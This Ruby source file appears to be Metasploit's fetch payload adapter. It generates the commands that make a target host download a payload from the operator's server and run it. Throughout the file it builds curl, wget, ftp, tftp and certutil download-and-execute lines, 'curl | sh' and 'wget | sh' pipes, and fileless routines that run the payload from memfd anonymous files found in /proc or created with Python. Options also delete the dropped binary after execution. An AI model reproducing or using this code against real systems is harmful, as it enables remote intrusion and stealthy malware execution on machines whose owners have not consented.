module Msf::Payload::Adapter::Fetch
  def initialize(*args)
    super
    register_options(
      [
        Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
        Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
        # FETCH_SRVHOST defaults to LHOST, but if the payload doesn't connect back to Metasploit (e.g. adduser, messagebox, etc.) then FETCH_SRVHOST needs to be set
        Msf::OptAddressRoutable.new('FETCH_SRVHOST', [ !options['LHOST']&.required, 'Local IP to use for serving payload']),
        Msf::OptString.new('FETCH_URIPATH', [ false, 'Local URI to use for serving payload', '']),
      ]
    )
    register_advanced_options(
      [
        Msf::OptAddress.new('FetchListenerBindAddress', [ false, 'The specific IP address to bind to to serve the payload if different from FETCH_SRVHOST']),
        Msf::OptPort.new('FetchListenerBindPort', [false, 'The port to bind to if different from FETCH_SRVPORT']),
        Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
      ]
    )
    @fetch_service = nil
    @myresources = []
    @srvexe = ''
    @pipe_uri = nil
    @pipe_cmd = nil
    @remote_destination_win = nil
    @remote_destination_nix = nil
    @windows = nil
  end

  # If no fetch URL is provided, we generate one based off the underlying payload data
  # This is because if we use a randomly-generated URI, the URI generated by venom and
  # Framework will not match.  This way, we can build a payload in venom and a listener
  # in Framework, and if the underlying payload type/host/port are the same, the URI
  # will be, too.
  #
  def default_srvuri
    # If we're in framework, payload is in datastore; msfvenom has it in refname
    payload_name = datastore['payload'] ||= refname
    decoded_uri = payload_name.dup
    # there may be no transport, so leave the connection string off if that's the case
    netloc = ''
    if module_info['ConnectionType'].upcase == 'REVERSE' || module_info['ConnectionType'].upcase == 'TUNNEL'
      netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
      unless datastore['LPORT'].blank?
        if Rex::Socket.is_ipv6?(netloc)
          netloc = "[#{netloc}]:#{datastore['LPORT']}"
        else
          netloc = "#{netloc}:#{datastore['LPORT']}"
        end
      end
    elsif module_info['ConnectionType'].upcase == 'BIND'
      netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
      unless datastore['RPORT'].blank?
        if Rex::Socket.is_ipv6?(netloc)
          netloc = "[#{netloc}]:#{datastore['RPORT']}"
        else
          netloc = "#{netloc}:#{datastore['RPORT']}"
        end
      end
    end
    decoded_uri << ";#{netloc}"
    Base64.urlsafe_encode64(OpenSSL::Digest::MD5.new(decoded_uri).digest, padding: false)
  end

  def download_uri
    "#{srvnetloc}/#{srvuri}"
  end

  def _download_pipe
    "#{srvnetloc}/#{@pipe_uri}"
  end

  def fetch_bindhost
    datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
  end

  def fetch_bindport
    datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
  end

  def fetch_bindnetloc
    Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
  end


  def generate(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    opts[:code] = super
    @srvexe = generate_payload_exe(opts)
    if datastore['FETCH_PIPE']
      unless %w[WGET CURL].include?(datastore['FETCH_COMMAND'].upcase)
        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected for FETCH_PIPE option')
      end
      @pipe_cmd = generate_fetch_commands
      vprint_status("Command served: #{@pipe_cmd}")
      cmd = generate_pipe_command
    else
      cmd = generate_fetch_commands
    end
    vprint_status("Command to run on remote host: #{cmd}")
    cmd
  end

  def generate_pipe_command
    # TODO: Make a check method that determines if we support a platform/server/command combination
    if srvuri.length < 3
      @pipe_uri = srvuri + 'p'
    else
      @pipe_uri = srvuri[...3]
    end

    case datastore['FETCH_COMMAND'].upcase
    when 'WGET'
      return _generate_wget_pipe
    when 'CURL'
      return _generate_curl_pipe
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected for FETCH_PIPE option')
    end
  end

  def generate_fetch_commands
    # TODO: Make a check method that determines if we support a platform/server/command combination
    #
    case datastore['FETCH_COMMAND'].upcase
    when 'FTP'
      return _generate_ftp_command
    when 'TNFTP'
      return _generate_tnftp_command
    when 'WGET'
      return _generate_wget_command
    when 'CURL'
      return _generate_curl_command
    when 'TFTP'
      return _generate_tftp_command
    when 'CERTUTIL'
      return _generate_certutil_command
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
  end

  def generate_stage(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def generate_payload_uuid(conf = {})
    conf[:arch] ||= module_info['AdaptedArch']
    conf[:platform] ||= module_info['AdaptedPlatform']
    super
  end

  def handle_connection(conn, opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def srvhost
    host = datastore['FETCH_SRVHOST']
    host = datastore['LHOST'] if host.blank?
    host = '127.127.127.127' if host.blank?
    host
  end

  def srvnetloc
    Rex::Socket.to_authority(srvhost, srvport)
  end

  def srvport
    datastore['FETCH_SRVPORT']
  end

  def srvuri
    return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?

    default_srvuri
  end

  def windows?
    return @windows unless @windows.nil?

    @windows = platform.platforms.first == Msf::Module::Platform::Windows
    @windows
  end

  def linux?
    return @linux unless @linux.nil?

    @linux = platform.platforms.first == Msf::Module::Platform::Linux
    @linux
  end

  def _check_tftp_port
    # Most tftp clients do not have configurable ports
    if datastore['FETCH_SRVPORT'] != 69 && datastore['FetchListenerBindPort'].blank?
      print_error('The TFTP client can only connect to port 69; to start the server on a different port use FetchListenerBindPort and redirect the connection.')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_SRVPORT must be set to 69 when using the tftp client')
    end
  end

  def _check_tftp_file
    # Older Linux tftp clients do not support saving the file under a different name
    unless datastore['FETCH_WRITABLE_DIR'].blank? && datastore['FETCH_FILENAME'].blank?
      print_error('The Linux TFTP client does not support saving a file under a different name than the URI.')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_WRITABLE_DIR and FETCH_FILENAME must be blank when using the tftp client')
    end
  end

  # copied from https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/socket_server.rb
  def _determine_server_comm(ip, srv_comm = datastore['ListenerComm'].to_s)
    comm = nil

    case srv_comm
    when 'local'
      comm = ::Rex::Socket::Comm::Local
    when /\A-?[0-9]+\Z/
      comm = framework.sessions.get(srv_comm.to_i)
      raise("Socket Server Comm (Session #{srv_comm}) does not exist") unless comm
      raise("Socket Server Comm (Session #{srv_comm}) does not implement Rex::Socket::Comm") unless comm.is_a? ::Rex::Socket::Comm
    when nil, ''
      unless ip.nil?
        comm = Rex::Socket::SwitchBoard.best_comm(ip)
      end
    else
      raise("SocketServer Comm '#{srv_comm}' is invalid")
    end

    comm || ::Rex::Socket::Comm::Local
  end

  def _execute_add(get_file_cmd)
    return _execute_win(get_file_cmd) if windows?

    return _execute_nix(get_file_cmd)
  end

  def _execute_win(get_file_cmd)
    cmds = " & start /B #{_remote_destination_win}"
    cmds << " & del #{_remote_destination_win}" if datastore['FETCH_DELETE']
    get_file_cmd << cmds
  end

  def _execute_nix(get_file_cmd)
    return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
    return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'


    cmds = get_file_cmd
    cmds << ";chmod +x #{_remote_destination_nix}"
    cmds << ";#{_remote_destination_nix}&"
    cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
    cmds
  end

  def _generate_certutil_command
    case fetch_protocol
    when 'HTTP'
      get_file_cmd = "certutil -urlcache -f http://#{download_uri} #{_remote_destination}"
    when 'HTTPS'
      # I don't think there is a way to disable cert check in certutil....
      print_error('CERTUTIL binary does not support insecure mode')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL')
      get_file_cmd = "certutil -urlcache -f https://#{download_uri} #{_remote_destination}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    cmd + _execute_add(get_file_cmd)
  end

  # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
  def _generate_fileless(get_file_cmd)
    # get list of all $USER's processes
    cmd = 'FOUND=0'
    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
    # already found anonymous file where we can write
    cmd << '; do if [ $FOUND -eq 0 ]'

    # look for every symbolic link with write rwx permissions
    # if found one, try to download payload into the anonymous file
    # and execute it
    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
    cmd << '; then $f'
    cmd << '; FOUND=1'
    cmd << '; break'
    cmd << '; fi'
    cmd << '; fi'
    cmd << '; done'
    cmd << '; fi'
    cmd << '; done'

    cmd
  end
  
  # same idea as _generate_fileless function, but force creating anonymous file handle
  def _generate_fileless_python(get_file_cmd)
    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
  end

  def _generate_curl_command
    case fetch_protocol
    when 'HTTP'
      get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri}"
    when 'HTTPS'
      get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri}"
    when 'TFTP'
      get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_curl_pipe
    case fetch_protocol
    when 'HTTP'
      return "curl -s http://#{_download_pipe} | sh"
    when 'HTTPS'
      return "curl -sk https://#{_download_pipe} | sh"
    when 'TFTP'
      return "curl -s tftp://#{_download_pipe} | sh"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
  end

  def _generate_ftp_command
    case fetch_protocol
    when 'FTP'
      get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
    when 'HTTP'
      get_file_cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}"
    when 'HTTPS'
      get_file_cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_tftp_command
    _check_tftp_port
    case fetch_protocol
    when 'TFTP'
      if windows?
        fetch_command = _execute_win("tftp -i #{srvhost} GET #{srvuri} #{_remote_destination}")
      else
        _check_tftp_file
        if datastore['FETCH_FILELESS'] != 'none' && linux?
          return _generate_fileless("(echo binary ; echo get #{srvuri} $f ) | tftp #{srvhost}")
        else
          fetch_command = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
        end
      end
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    fetch_command
  end

  def _generate_tnftp_command
    case fetch_protocol
    when 'FTP'
      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
    when 'HTTP'
      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}"
    when 'HTTPS'
      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_wget_command
    case fetch_protocol
    when 'HTTPS'
      get_file_cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
    when 'HTTP'
      get_file_cmd = "wget -qO #{_remote_destination} http://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end

    _execute_add(get_file_cmd)
  end

  def _generate_wget_pipe
    case fetch_protocol
    when 'HTTPS'
      return "wget --no-check-certificate -qO - https://#{_download_pipe} | sh"
    when 'HTTP'
      return "wget -qO - http://#{_download_pipe} | sh"
    else
      return nil
    end
  end

  def _remote_destination
    return _remote_destination_win if windows?

    return _remote_destination_nix
  end

  def _remote_destination_nix
    return @remote_destination_nix unless @remote_destination_nix.nil?

    if datastore['FETCH_FILELESS'] != 'none'
      @remote_destination_nix = '$f'
    else
      writable_dir = datastore['FETCH_WRITABLE_DIR']
      writable_dir = '.' if writable_dir.blank?
      writable_dir += '/' unless writable_dir[-1] == '/'
      payload_filename = datastore['FETCH_FILENAME']
      payload_filename = srvuri if payload_filename.blank?
      payload_path = writable_dir + payload_filename
      @remote_destination_nix = payload_path
    end
    @remote_destination_nix
  end

  def _remote_destination_win
    return @remote_destination_win unless @remote_destination_win.nil?

    writable_dir = datastore['FETCH_WRITABLE_DIR']
    writable_dir += '\\' unless writable_dir.blank? || writable_dir[-1] == '\\'
    payload_filename = datastore['FETCH_FILENAME']
    payload_filename = srvuri if payload_filename.blank?
    payload_path = writable_dir + payload_filename
    payload_path += '.exe' unless payload_path[-4..] == '.exe'
    @remote_destination_win = payload_path
    @remote_destination_win
  end
end
